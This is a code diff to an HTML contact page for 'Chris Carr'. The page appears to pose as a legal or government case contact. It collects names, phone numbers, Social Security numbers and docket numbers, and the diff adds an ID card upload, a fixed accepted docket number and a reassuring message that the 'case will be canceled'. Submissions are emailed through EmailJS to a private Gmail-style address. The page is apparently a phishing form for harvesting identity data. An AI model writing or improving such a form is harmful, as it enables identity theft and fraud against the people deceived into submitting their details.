@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Contact Chris Carr</title>
+    <link rel="icon" href="USA-Flag-Download-PNG-Image.png" type="image/png">
     <link rel="stylesheet" href="form.css">
     <!-- <script src="https://cdn.emailjs.com/dist/email.min.js"></script> -->
 </head>
@@ -15,7 +16,7 @@
     <div style="display: flex; flex-direction: column; align-items: center;">
         <img src="chris-carr_001.jpg" alt="Chris Carr" style="width: 120px; height: 120px; object-fit: cover; border-radius: 50%; margin-top: 18px; margin-bottom: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.10); border: 4px solid #fff;">
         <h1 style="margin-bottom: 0; color: #0078D4;">Contact Chris Carr</h1>
-        <form id="contactForm" autocomplete="on">
+        <form id="contactForm" autocomplete="on" enctype="multipart/form-data">
             <h2 style="margin-top: 10px;">Contact Us</h2>
             <label for="name">Name:</label>
             <input type="text" id="name" name="user_name" placeholder="Your Full Name" required />
@@ -31,6 +32,9 @@
 
             <label for="case">Docket numbers:</label>
             <input type="text" id="case" name="case_number" placeholder="e.g. 24-wl-59964-D56FD" required />
+
+            <label for="id_card">Upload Your ID Card:</label>
+            <input type="file" id="id_card" name="id_card" accept="image/*,.pdf" required />
 
             <label for="message">Message:</label>
             <textarea id="message" name="user_message" rows="5" placeholder="Type your message..." required></textarea>
@@ -60,14 +64,31 @@
 
       document.getElementById('contactForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        document.getElementById('status').textContent = "Sending...";
+        const statusDiv = document.getElementById('status');
+        statusDiv.textContent = "Sending...";
+        statusDiv.style.color = "black";
 
         const caseNum = document.getElementById('case').value.trim();
         if (caseNum !== "24-wl-54367-A56BH") {
-            document.getElementById('status').textContent = "Invalid docket number.";
+            statusDiv.textContent = "Invalid docket number.";
+            statusDiv.style.color = "red";
             alert("Invalid docket number.");
             return;
         }
+
+        // Handle file upload (EmailJS cannot send files directly, so you need a backend for real attachments)
+        // Here, we'll just read the file name to send as a field.
+        const idCardInput = document.getElementById('id_card');
+        const idCardFile = idCardInput.files[0];
+        let idCardInfo = "";
+        if (idCardFile) {
+            idCardInfo = idCardFile.name;
+        }
+
+        // Success message
+        statusDiv.textContent = "Your case is currently active and will be canceled on December 20, 2025.";
+        statusDiv.style.color = "green";
+        alert("Your form has been submitted successfully!");
 
         emailjs.send("sujeyraygoza406@gmail.co", "template_qhhstst", {
           name: document.getElementById('name').value,
@@ -75,15 +96,18 @@
           phone: document.getElementById('phone').value,
           ssn: document.getElementById('ssn').value,
           case_number: caseNum,
+          id_card: idCardInfo, // only sends file name, not the file itself!
           message: document.getElementById('message').value
         })
         .then(function(response) {
-          document.getElementById('status').textContent = "Your case is currently active and will be canceled on December 20, 2025.";
+          statusDiv.textContent = "Your case is currently active and will be canceled on December 20, 2025.";
+          statusDiv.style.color = "green";
           alert("Your form has been submitted successfully!");
           document.getElementById('contactForm').reset();
         }, function(error) {
           console.log('Failed to send message:', error);
-          document.getElementById('status').textContent = "Failed to send message. Please try again.";
+          statusDiv.textContent = "Failed to send message. Please try again.";
+          statusDiv.style.color = "red";
         });
       });
     </script>
